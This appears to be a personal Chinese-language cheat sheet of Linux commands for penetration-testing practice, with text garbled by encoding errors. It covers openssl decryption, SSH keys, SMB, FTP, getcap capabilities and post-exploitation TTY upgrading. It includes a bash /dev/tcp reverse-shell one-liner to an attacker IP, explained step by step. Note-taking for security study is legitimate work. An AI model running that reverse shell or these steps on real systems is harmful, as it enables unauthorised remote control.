<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"># AES è§£å¯†</span><br><span class="line">openssl enc -d -aes<span class="number">-256</span>-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># DES è§£å¯†</span><br><span class="line">openssl enc -d -des-ede3-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># RSA è§£å¯†</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -inkey private_key.pem -<span class="keyword">out</span> decrypted.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å‚æ•°è§£é‡Šï¼š<br>openssl enc: è¿™ä¸ªå‘½ä»¤ç”¨äºå¯¹ç§°åŠ å¯†æˆ–è§£å¯†ï¼Œenc è¡¨ç¤ºä½¿ç”¨åŠ å¯†ç®—æ³•ã€‚</p>
<p>-d: è§£å¯†æ¨¡å¼ï¼Œè¡¨ç¤ºå¯¹åŠ å¯†æ–‡ä»¶è¿›è¡Œè§£å¯†æ“ä½œã€‚<br>-aes-256-cbc: æŒ‡å®šåŠ å¯†ç®—æ³•ä¸º AESï¼Œä½¿ç”¨ 256 ä½å¯†é’¥å’Œ CBC æ¨¡å¼ã€‚<br>-des-ede3-cbc: æŒ‡å®šåŠ å¯†ç®—æ³•ä¸º DESï¼Œä½¿ç”¨ 3 é‡åŠ å¯† (EDE3) å’Œ CBC æ¨¡å¼ã€‚<br>-in encrypted.txt: è¾“å…¥çš„åŠ å¯†æ–‡ä»¶ã€‚<br>-out decrypted.txt: è§£å¯†åçš„è¾“å‡ºæ–‡ä»¶ã€‚<br>-k password: å¯†é’¥ï¼Œé€šå¸¸æ˜¯å¯†ç å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œç”¨äºè§£å¯†è¿‡ç¨‹ã€‚<br>openssl rsautl: ç”¨äºè¿›è¡Œ RSA åŠ å¯†ã€è§£å¯†æˆ–ç­¾åéªŒè¯ã€‚</p>
<p>-decrypt: è§£å¯†æ¨¡å¼ï¼Œç”¨äºå¯¹ä½¿ç”¨ RSA åŠ å¯†çš„æ–‡ä»¶è¿›è¡Œè§£å¯†ã€‚<br>-in encrypted.txt: è¾“å…¥çš„åŠ å¯†æ–‡ä»¶ã€‚<br>-inkey private_key.pem: æŒ‡å®šç§é’¥æ–‡ä»¶ï¼Œç§é’¥ç”¨äºè§£å¯†æ“ä½œã€‚<br>-out decrypted.txt: è§£å¯†åçš„è¾“å‡ºæ–‡ä»¶ã€‚</p>
<h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><ul>
<li>å°†æ ‡å‡†è¾“å…¥ä¼ é€’ç»™å…¶ä»–å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œecho â€œfile1 file2 file3â€ | xargs lsï¼Œè¿™æ¡å‘½ä»¤å…ˆé€šè¿‡echoè¾“å‡ºæ–‡ä»¶ååˆ—è¡¨ï¼Œç„¶åxargså°†è¿™äº›æ–‡ä»¶åä½œä¸ºå‚æ•°ä¼ é€’ç»™lså‘½ä»¤ï¼Œå®ç°åˆ—å‡ºè¿™äº›æ–‡ä»¶çš„ä¿¡æ¯ã€‚</li>
<li>-né€‰é¡¹å¯æŒ‡å®šæ¯æ¬¡ä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°æ•°é‡ã€‚ä¾‹å¦‚echo {1..10} | xargs -n 3 echoï¼Œä¼šå°†è¾“å…¥çš„æ•°å­—æ¯ 3 ä¸ªä¸€ç»„ä¼ é€’ç»™echoå‘½ä»¤ï¼Œå®ç°åˆ†ç»„è¾“å‡º</li>
</ul>
<h2 id="id-rsa"><a href="#id-rsa" class="headerlink" title="id_rsa"></a>id_rsa</h2><p>è¿™ä¸ªæ–‡ä»¶é€šå¸¸å­˜çš„æ˜¯sshçš„ç§é’¥ å¯ä»¥ç”¨ssh -i id_rsaæ¥è¿›è¡Œssh ç™»å½• ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶çš„æƒé™è¦å…ˆchmod 600<br>å…¬é’¥æ–‡ä»¶æƒé™æ˜¯644</p>
<h2 id="ssh-authorized-keys"><a href="#ssh-authorized-keys" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> æ˜¯ä¸€ä¸ª <strong>å…¬é’¥è®¤è¯</strong> æ–‡ä»¶ï¼Œå®ƒå­˜å‚¨çš„æ˜¯ <strong>å¯ä»¥ç”¨äºæ— å¯†ç  SSH ç™»å½•è¯¥è´¦æˆ·çš„å…¬é’¥</strong>ã€‚</p>
<h3 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a><strong>ä½œç”¨</strong></h3><p>å½“ä½ å°è¯•é€šè¿‡ SSH ç™»å½•åˆ°ä¸€ä¸ªè´¦æˆ·æ—¶ï¼ˆæ¯”å¦‚ <code>ssh user@host</code>ï¼‰ï¼ŒSSH æœåŠ¡å™¨ä¼šæ£€æŸ¥ <code>~/.ssh/authorized_keys</code> æ–‡ä»¶ï¼Œå¦‚æœå…¶ä¸­åŒ…å«ä¸ä½ çš„ç§é’¥åŒ¹é…çš„å…¬é’¥ï¼Œå°±å…è®¸ä½ ç™»å½•ï¼Œè€Œ <strong>æ— éœ€è¾“å…¥å¯†ç </strong>ã€‚<br><code>~/.ssh/authorized_keys</code> <strong>æ”¯æŒåœ¨å…¬é’¥å‰é¢æŒ‡å®š <code>command=</code> é€‰é¡¹</strong>ï¼Œè¿™æ · <strong>æ¯æ¬¡æœ‰äººä½¿ç”¨è¯¥å…¬é’¥ç™»å½•æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤</strong>ï¼Œè€Œä¸ä¼šå¯åŠ¨æ™®é€šçš„ shellã€‚</p>
<h3 id="ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥"><a href="#ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥" class="headerlink" title="ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥"></a>ç”¨ç§é’¥ç”Ÿæˆå…¬é’¥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
<p>ğŸ“Œ <strong>è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>-y</code>ï¼šä»ç§é’¥ä¸­æå–å…¬é’¥</li>
<li><code>-f id_rsa</code>ï¼šæŒ‡å®šç§é’¥æ–‡ä»¶</li>
<li><code>&gt; authorized_keys</code>ï¼šè¾“å‡ºå…¬é’¥åˆ°æ–‡ä»¶</li>
<li></li>
</ul>
<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="Samba-ç®€ä»‹"><a href="#Samba-ç®€ä»‹" class="headerlink" title="Samba ç®€ä»‹"></a>Samba ç®€ä»‹</h3><p>åœ¨ Linux ä¸­ï¼ŒSMBï¼ˆServer Message Blockï¼‰æœåŠ¡æ˜¯ä¸€ç§ç½‘ç»œæ–‡ä»¶å…±äº«åè®®ï¼Œé€šå¸¸ç”¨äºåœ¨ç½‘ç»œä¸­å…±äº«æ–‡ä»¶ã€æ‰“å°æœºå’Œå…¶ä»–èµ„æºã€‚<br>SMB æœ€åˆç”± Microsoft å¼€å‘ï¼Œå¹¶ä¸”æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨çš„æ–‡ä»¶å…±äº«åè®®ã€‚<br>åœ¨ Linux ç³»ç»Ÿä¸­ï¼ŒSMB æœåŠ¡é€šå¸¸ç”± Samba è½¯ä»¶æä¾›æ”¯æŒã€‚</p>
<h3 id="ä¸»è¦åŠŸèƒ½"><a href="#ä¸»è¦åŠŸèƒ½" class="headerlink" title="ä¸»è¦åŠŸèƒ½"></a>ä¸»è¦åŠŸèƒ½</h3><p>æ–‡ä»¶å…±äº«ï¼šå…è®¸åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´å…±äº«æ–‡ä»¶å’Œç›®å½•ã€‚<br>æ‰“å°æœºå…±äº«ï¼šå…è®¸åœ¨ç½‘ç»œä¸­å…±äº«æ‰“å°æœºã€‚<br>ç½‘ç»œæµè§ˆï¼šå…è®¸è®¡ç®—æœºæŸ¥çœ‹å’Œæµè§ˆç½‘ç»œä¸­çš„å…±äº«èµ„æºã€‚</p>
<h3 id="ä¸»è¦é…ç½®æ–‡ä»¶"><a href="#ä¸»è¦é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸»è¦é…ç½®æ–‡ä»¶"></a>ä¸»è¦é…ç½®æ–‡ä»¶</h3><p>&#x2F;etc&#x2F;samba&#x2F;smb.confï¼šSamba çš„ä¸»è¦é…ç½®æ–‡ä»¶ï¼Œç®¡ç†å‘˜åœ¨æ­¤è®¾ç½®å…±äº«ç›®å½•ã€è®¿é—®æƒé™ç­‰ã€‚<br>smbclientï¼šå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºè¿æ¥å’Œè®¿é—® SMB å…±äº«èµ„æºã€‚</p>
<h3 id="smbclient-å‚æ•°å’Œä½¿ç”¨"><a href="#smbclient-å‚æ•°å’Œä½¿ç”¨" class="headerlink" title="smbclient å‚æ•°å’Œä½¿ç”¨"></a>smbclient å‚æ•°å’Œä½¿ç”¨</h3><p>-Lï¼šåˆ—å‡ºå…±äº«èµ„æºçš„ä¿¡æ¯ã€‚</p>
<p>-Uï¼šæŒ‡å®šè¿æ¥æ—¶ä½¿ç”¨çš„ç”¨æˆ·åã€‚</p>
<p>&#x2F;&#x2F;ï¼šæŒ‡å®šå…±äº«èµ„æºçš„è·¯å¾„ï¼Œé€šå¸¸ä»¥ &#x2F;&#x2F;&lt;æœåŠ¡å™¨åœ°å€&gt;&#x2F;&lt;å…±äº«åç§°&gt; çš„æ ¼å¼æŒ‡å®šã€‚</p>
<p>ç¤ºä¾‹ï¼šè®¿é—® server ä¸Šçš„å…±äº«ç›®å½• shareï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">smbclient //<span class="keyword">server</span>/<span class="keyword">share</span> -U username</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-Wï¼šæŒ‡å®šå·¥ä½œç»„åã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-Iï¼šæŒ‡å®šç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-cï¼šç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿›å…¥äº¤äº’æ¨¡å¼ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-pï¼šæŒ‡å®šç«¯å£å·ï¼Œé»˜è®¤æ˜¯ 445ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-Nï¼šè·³è¿‡ç”¨æˆ·åå¯†ç æç¤ºï¼Œä½¿ç”¨åŒ¿åæ–¹å¼ã€‚</span></span><br></pre></td></tr></table></figure></div>
<p>å¸¸ç”¨æ“ä½œ<br>ä¸‹è½½æ–‡ä»¶ï¼šä½¿ç”¨ get å‘½ä»¤ä¸‹è½½æ–‡ä»¶ã€‚<br>ä¸Šä¼ æ–‡ä»¶ï¼šä½¿ç”¨ put å‘½ä»¤ä¸Šä¼ æ–‡ä»¶ã€‚</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>FTPï¼ˆFile Transfer Protocolï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“æ–‡ä»¶çš„æ ‡å‡†åè®®ã€‚å®ƒä½¿ç”¨å®¢æˆ·ç«¯ - æœåŠ¡å™¨æ¨¡å‹ï¼Œå®¢æˆ·ç«¯é€šè¿‡ FTP è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ã€‚FTP é»˜è®¤ä½¿ç”¨ç«¯å£Â <code>21</code>ã€‚<br>ftp username@ip ç™»å½•ftp  å¦‚æœè¦åŒ¿åç™»å½• ç”¨æˆ·åå°±ç”¨anonymous</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ftp</span> anonymous@<span class="keyword">ftp</span>.example.com</span><br></pre></td></tr></table></figure></div>
<h3 id="å¸¸ç”¨äº¤äº’å‘½ä»¤ï¼ˆç™»å½•åä½¿ç”¨ï¼‰"><a href="#å¸¸ç”¨äº¤äº’å‘½ä»¤ï¼ˆç™»å½•åä½¿ç”¨ï¼‰" class="headerlink" title="å¸¸ç”¨äº¤äº’å‘½ä»¤ï¼ˆç™»å½•åä½¿ç”¨ï¼‰"></a>å¸¸ç”¨äº¤äº’å‘½ä»¤ï¼ˆç™»å½•åä½¿ç”¨ï¼‰</h3><table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>user</code></td>
<td>é‡æ–°è¾“å…¥ç”¨æˆ·å</td>
<td><code>user anonymous</code></td>
</tr>
<tr>
<td><code>pass</code></td>
<td>è¾“å…¥å¯†ç ï¼ˆåŒ¿åç™»å½•å¯ç•™ç©ºï¼‰</td>
<td><code>pass</code></td>
</tr>
<tr>
<td><code>binary</code></td>
<td>è®¾ç½®ä¸ºäºŒè¿›åˆ¶ä¼ è¾“æ¨¡å¼</td>
<td><code>binary</code></td>
</tr>
<tr>
<td><code>ascii</code></td>
<td>è®¾ç½®ä¸ºæ–‡æœ¬ä¼ è¾“æ¨¡å¼</td>
<td><code>ascii</code></td>
</tr>
<tr>
<td><code>get</code></td>
<td>ä¸‹è½½å•ä¸ªæ–‡ä»¶</td>
<td><code>get file.txt</code></td>
</tr>
<tr>
<td><code>mget</code></td>
<td>ä¸‹è½½å¤šä¸ªæ–‡ä»¶ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰</td>
<td><code>mget *.log</code></td>
</tr>
<tr>
<td><code>put</code></td>
<td>ä¸Šä¼ å•ä¸ªæ–‡ä»¶</td>
<td><code>put backup.zip</code></td>
</tr>
<tr>
<td><code>mput</code></td>
<td>ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ï¼ˆæ”¯æŒé€šé…ç¬¦ï¼‰</td>
<td><code>mput *.jpg</code></td>
</tr>
<tr>
<td><code>passive</code></td>
<td>åˆ‡æ¢è¢«åŠ¨æ¨¡å¼çŠ¶æ€</td>
<td><code>passive</code></td>
</tr>
<tr>
<td><code>ls</code></td>
<td>åˆ—å‡ºè¿œç¨‹ç›®å½•æ–‡ä»¶</td>
<td><code>ls /pub</code></td>
</tr>
<tr>
<td><code>cd</code></td>
<td>åˆ‡æ¢è¿œç¨‹ç›®å½•</td>
<td><code>cd /downloads</code></td>
</tr>
<tr>
<td><code>lcd</code></td>
<td>åˆ‡æ¢æœ¬åœ°ç›®å½•</td>
<td><code>lcd ~/Documents</code></td>
</tr>
<tr>
<td><code>quit</code>&#x2F;<code>bye</code></td>
<td>é€€å‡º FTP ä¼šè¯</td>
<td><code>quit</code></td>
</tr>
</tbody></table>
<h2 id="getcap"><a href="#getcap" class="headerlink" title="getcap"></a>getcap</h2><p><code>getcap</code> ç”¨äºåˆ—å‡ºå’Œæ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„èƒ½åŠ›ã€‚èƒ½åŠ›æ˜¯é€šè¿‡æ–‡ä»¶ç³»ç»Ÿé™„åŠ åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸Šçš„ç‰¹å®šæƒé™ï¼Œèƒ½å¤Ÿæ§åˆ¶è¯¥ç¨‹åºåœ¨è¿è¡Œæ—¶æ‰§è¡ŒæŸäº›ç‰¹æƒæ“ä½œï¼ˆå¦‚ç½‘ç»œè®¿é—®ã€æ–‡ä»¶è®¿é—®ç­‰ï¼‰ï¼Œè€Œä¸éœ€è¦å®Œå…¨çš„ root æƒé™ã€‚<br><strong><code>getcap &lt;file&gt;</code></strong>    æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„èƒ½åŠ›ä¿¡æ¯<br><strong><code>getcap -r &lt;directory&gt;</code></strong>    é€’å½’åœ°åˆ—å‡ºæŒ‡å®šç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„èƒ½åŠ›ä¿¡æ¯ã€‚<br><strong><code>getcap -v &lt;file&gt;</code></strong>    æ˜¾ç¤ºæ–‡ä»¶çš„è¯¦ç»†èƒ½åŠ›ä¿¡æ¯</p>
<h3 id="èƒ½åŠ›ï¼ˆCapabilitiesï¼‰ç¤ºä¾‹"><a href="#èƒ½åŠ›ï¼ˆCapabilitiesï¼‰ç¤ºä¾‹" class="headerlink" title="èƒ½åŠ›ï¼ˆCapabilitiesï¼‰ç¤ºä¾‹"></a><strong>èƒ½åŠ›ï¼ˆCapabilitiesï¼‰ç¤ºä¾‹</strong></h3><ul>
<li><strong><code>cap_net_raw</code></strong><br>  å…è®¸ç¨‹åºä½¿ç”¨åŸå§‹ç½‘ç»œå¥—æ¥å­—ï¼ˆä¾‹å¦‚æ‰§è¡Œ <code>ping</code> å‘½ä»¤ï¼‰ã€‚</li>
<li><strong><code>cap_dac_read_search</code></strong><br>  å…è®¸ç¨‹åºç»•è¿‡æ–‡ä»¶çš„è¯»å’Œæœç´¢æƒé™æ£€æŸ¥ã€‚</li>
<li><strong><code>cap_sys_admin</code></strong><br>  å…è®¸ç¨‹åºæ‰§è¡Œè®¸å¤šç³»ç»Ÿç®¡ç†æ“ä½œï¼Œç›¸å½“äº root æƒé™ã€‚</li>
<li><strong><code>cap_chown</code></strong><br>  å…è®¸ç¨‹åºæ›´æ”¹æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç»„ã€‚</li>
<li><strong><code>cap_setuid</code></strong><br>  å…è®¸ç¨‹åºæ›´æ”¹è‡ªå·±çš„ç”¨æˆ· IDã€‚<br>ä½¿ç”¨æ—¶ç”¨&#x2F;usr&#x2F;sbin&#x2F;getcap è¿™ä¸ªç›®å½•ä¸‹çš„æƒé™æ›´é«˜  èƒ½æ‰¾åˆ°æ›´å¤šæ–‡ä»¶</li>
</ul>
<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><p>ln æ˜¯ Linux ç³»ç»Ÿä¸­çš„ åˆ›å»ºé“¾æ¥å‘½ä»¤ï¼Œç”¨äºåˆ›å»º ç¡¬é“¾æ¥ æˆ– ç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-6"><a href="#å¸¸ç”¨å‚æ•°-6" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td><code>-s</code></td>
<td>åˆ›å»ºç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>å¼ºåˆ¶è¦†ç›–å·²å­˜åœ¨çš„é“¾æ¥</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>å–æ¶ˆå¯¹ç›®æ ‡çš„ç¬¦å·é“¾æ¥è§£æ</td>
</tr>
</tbody></table>
<h2 id="bash-i-dev-tcp-ip-1234-0-1"><a href="#bash-i-dev-tcp-ip-1234-0-1" class="headerlink" title="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1"></a>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</h2><p> åå¼¹shellæŒ‡ä»¤</p>
<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><p>bash æ˜¯ Unix ç³»ç»Ÿä¸Šçš„ä¸€ä¸ªå¸¸ç”¨ shellï¼ˆå‘½ä»¤è¡Œè§£é‡Šå™¨ï¼‰ã€‚bash å¯ä»¥å¯åŠ¨äº¤äº’å¼æˆ–éäº¤äº’å¼ shellã€‚<br>-i é€‰é¡¹ä½¿ bash å¯åŠ¨ä¸ºäº¤äº’å¼ shellï¼Œè¿™æ„å‘³ç€ shell ä¼šå°è¯•ä»æ ‡å‡†è¾“å…¥è¯»å–å‘½ä»¤å¹¶æ‰“å°æ ‡å‡†è¾“å‡ºã€‚äº¤äº’å¼ shell è¿˜ä¼šåŠ è½½ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚ .bashrcï¼‰ï¼Œä½¿å…¶è¡Œä¸ºä¸æ™®é€šç»ˆç«¯ç›¸ä¼¼ã€‚</p>
<h3 id="dev-tcp-192-168-240-83-1234"><a href="#dev-tcp-192-168-240-83-1234" class="headerlink" title="&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234"></a>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</h3><blockquote>
<p>&amp; æ˜¯ Bash ä¸­ç”¨äºé‡å®šå‘è¾“å‡ºçš„è¯­æ³•ï¼Œå®ƒå°†æ–‡ä»¶æè¿°ç¬¦ä»ä¸€ä¸ªåœ°æ–¹é‡å®šå‘åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚<br>&#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶è·¯å¾„ï¼Œå®ƒæ˜¯ Bash å†…ç½®çš„ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡ TCP è¿æ¥å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚å®ƒè¡¨ç¤ºä¸€ä¸ª TCP è¿æ¥ï¼Œå…¶ä¸­ 192.168.240.83 æ˜¯ç›®æ ‡ IP åœ°å€ï¼Œ1234 æ˜¯ç›®æ ‡ç«¯å£å·ã€‚<br>è¿™ç§æ–¹å¼å…è®¸ Bash å°†è¾“å‡ºæµé‡å®šå‘åˆ°ä¸€ä¸ª TCP è¿æ¥ï¼Œè€Œä¸æ˜¯æ™®é€šçš„æ–‡ä»¶æˆ–ç»ˆç«¯ã€‚è¿™ä½¿å¾— Bash å¯ä»¥å°†è¾“å‡ºï¼ˆå¦‚å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼‰å‘é€åˆ°è¿œç¨‹ä¸»æœºã€‚<br>æ‰€ä»¥ï¼Œ&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 å°† bash çš„æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆSTDERRï¼‰éƒ½é‡å®šå‘åˆ°ç›®æ ‡æœºå™¨çš„ IP åœ°å€ 192.168.240.83ï¼Œå¹¶é€šè¿‡ç«¯å£ 1234 å‘é€ã€‚</p>
</blockquote>
<h3 id="0-1"><a href="#0-1" class="headerlink" title="0&gt;&amp;1"></a>0&gt;&amp;1</h3><p>0 ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ã€‚</p>
<blockquote>
<p>&amp;1 å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚è¿™æ„å‘³ç€è¾“å…¥æµä¼šä» TCP è¿æ¥è€Œä¸æ˜¯ç»ˆç«¯æ¥æ”¶ã€‚<br>é€šè¿‡è¿™ä¸€éƒ¨åˆ†ï¼Œbash çš„æ ‡å‡†è¾“å…¥ï¼ˆå‘½ä»¤è¾“å…¥ï¼‰ä¼šä»è¿œç¨‹æœºå™¨çš„ TCP è¿æ¥æ¥æ”¶ï¼Œè€Œä¸æ˜¯ä»ç”¨æˆ·çš„ç»ˆç«¯æ¥æ”¶ã€‚<br>ç»¼åˆè§£é‡Š<br>æ•´ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯ï¼š<br>å¯åŠ¨ä¸€ä¸ªäº¤äº’å¼ Bash shell (bash -i)ã€‚<br>å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ª TCP è¿æ¥ï¼Œç›®æ ‡ IP ä¸º 192.168.240.83ï¼Œç›®æ ‡ç«¯å£ä¸º 1234ã€‚<br>å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ° TCP è¿æ¥ï¼Œä»è¿œç¨‹æœºå™¨æ¥æ”¶è¾“å…¥ã€‚<br>åå‘ Shell<br>è¿™è¡Œå‘½ä»¤çš„ä½œç”¨å°±æ˜¯åˆ›å»ºä¸€ä¸ªåå‘ shellã€‚å—å®³ä¸»æœºé€šè¿‡ bash è¿æ¥åˆ°æ”»å‡»è€…çš„æœºå™¨ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªæŒ‡å®šçš„ç«¯å£ï¼ˆè¿™é‡Œæ˜¯ 1234ï¼‰ä¸æ”»å‡»è€…è¿›è¡Œäº¤äº’ï¼š</p>
</blockquote>
<h2 id="stty-raw-echo-fg-ç¾åŒ–ç»ˆç«¯"><a href="#stty-raw-echo-fg-ç¾åŒ–ç»ˆç«¯" class="headerlink" title="stty raw -echo; fg (ç¾åŒ–ç»ˆç«¯)"></a>stty raw -echo; fg (ç¾åŒ–ç»ˆç«¯)</h2><p><code>stty raw -echo; fg</code>Â æ˜¯ä¸€ä¸ªç»„åˆå‘½ä»¤ï¼Œé€šå¸¸ç”¨äºæ¢å¤ç»ˆç«¯çš„æ­£å¸¸è¡Œä¸ºæˆ–ä»åå°æ¢å¤ä¸€ä¸ªæŒ‚èµ·çš„ä»»åŠ¡ã€‚<br>åˆšæ‰ç”¨äº†<code>script -qc /bin/bash /dev/null</code>ç„¶åctrl+zæŒ‚èµ·äº†é‚£ä¸ªå›è¯<br>å†è¾“å…¥reset xtermå‡çº§ç»ˆç«¯<br>ç„¶åå†è¾“å…¥å½“å‰kaliçš„sttyçš„è¡Œæ•°åˆ—æ•°  å…ˆç”¨stty -aè·å–è¡Œæ•°åˆ—æ•°<br>ç„¶ååœ¨web shellä¸­è¾“å…¥ stty rows 34 columns 115<br>å®Œæ•´ç¾åŒ–ç»ˆç«¯æ“ä½œï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + zæŒ‚èµ·</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">æœ¬æœº<span class="built_in">stty</span> -a æŸ¥çœ‹è‡ªå·±çš„  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>

<h2 id="â€“"><a href="#â€“" class="headerlink" title="â€“"></a>â€“</h2><p>å½“åˆ›å»º&#x2F;ä½¿ç”¨çš„æ–‡ä»¶åä¸­æœ‰â€“æ—¶ï¼Œè¦åœ¨å‘½ä»¤ä¸­åŠ ä¸Šâ€“ å‘Šè¯‰å‘½ä»¤åé¢çš„ä¸æ˜¯å‚æ•°ï¼Œå› ä¸ºé»˜è®¤â€“åé¢è·Ÿç€å‚æ•°</p>
